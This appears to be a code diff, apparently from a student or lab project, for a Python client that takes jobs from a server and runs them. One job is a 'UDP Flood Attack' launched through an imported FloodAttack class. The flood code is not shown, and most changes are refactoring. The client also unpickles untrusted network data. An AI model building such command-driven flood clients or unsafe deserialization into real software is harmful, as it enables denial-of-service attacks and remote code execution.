@@ -1,8 +1,11 @@
-import socket
-import sys
 import pickle
-import os
 from FloodAttack import *
+
+'''
+After Client runs Job Specific Program (EX: UDP Flood Attack)
+Send Message to Server to tell Job Creator the job is complete
+'''
+
 
 class Client(object):
 
@@ -18,7 +21,7 @@ class Client(object):
         self.SERVER = "127.0.0.1"
         self.PORT = 1233
 
-        #Needed Objects
+        # Needed Objects
         self.udpAttack = FloodAttack()
 
         # Creating Client Socket Object
@@ -27,11 +30,14 @@ class Client(object):
         # Connecting Client--->Server
         self.client.connect((self.SERVER, self.PORT))
 
+    '''
+    HELPER Functions
+    '''
+
     def JobCorS(self):
 
         # When True The Client Can Send and Receive Messages
         while True:
-
             count = 1
 
             # Limiting to 1024 bytes
@@ -40,20 +46,16 @@ class Client(object):
             # Sets in_data to what is sent from the Server
             in_data = pickle.loads(in_data)
 
+            # For Running Specific Job
             self.jobPrograms(in_data)
 
-            # If JobList is sent from Server Print the Job List
-            if type(in_data) == list:
-                for job in in_data:
-                    print(str(count) + ":")
-                    count += 1
-                    for element in job:
-                        print(element, end=" ")
-                    print()
-            else:
-                print(in_data)
+            # For Displaying the List to Client
+            self.obtainList(in_data)
 
-            # Getting Message For Server
+            # For Displaying Messages From The Server
+            self.normalCommunication(in_data)
+
+            # Gathering Input From Client to send to Server
             out_data = input()
 
             # Sending Message To Server
@@ -76,13 +78,33 @@ class Client(object):
         elif in_data == "TCP Flood Attack":
             print("Job 6")
         elif in_data == "UDP Flood Attack":
-            print("Job 7")
             self.udpAttack.UDPAttack()
 
+    def obtainList(self, in_data):
+        count = 1
+
+        # If JobList is sent from Server Print the Job List
+        if type(in_data) == list:
+            for job in in_data:
+                print(str(count) + ":")
+                count += 1
+                for element in job:
+                    if len(element) == 1:
+                        print(element, end="")
+                    else:
+                        print(element, end=" ")
+                print()
+
+    def normalCommunication(self, in_data):
+        if type(in_data) != list:
+            print(in_data)
+
+    # Main Function
     def main(self):
         self.JobCorS()
 
 
+# Start Main Function
 if __name__ == "__main__":
     s = Client()
     s.main()
